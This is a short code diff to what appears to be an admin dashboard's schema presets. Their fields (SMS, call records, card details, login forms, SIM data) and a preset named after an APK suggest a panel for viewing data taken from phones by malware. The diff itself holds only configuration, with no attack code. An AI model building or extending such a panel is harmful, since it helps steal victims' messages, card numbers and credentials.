@@ -97,10 +97,7 @@ include_once __DIR__ . '/header.php';
       };
 
       const DEFAULT_SCHEMA_PRESETS = {
-        v1_standard: { name: "⚡ Adminto Standard V1", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" },
-        rtdb_v2: { name: "🔥 RTDB Custom V2 (Your Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
-        motupatlu: { name: "📱 MotuPatlu APK Preset", sms: "sma", calls: "call_records", cards: "card_details", forms: "userInputs", sims: "sims" },
-        legacy: { name: "🛡️ Legacy Classic Preset", sms: "messages", calls: "call_logs", cards: "cards", forms: "finalData", sims: "sim_info" }
+        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" }
       };
 
       const [customPresets, setCustomPresets] = React.useState(() => {
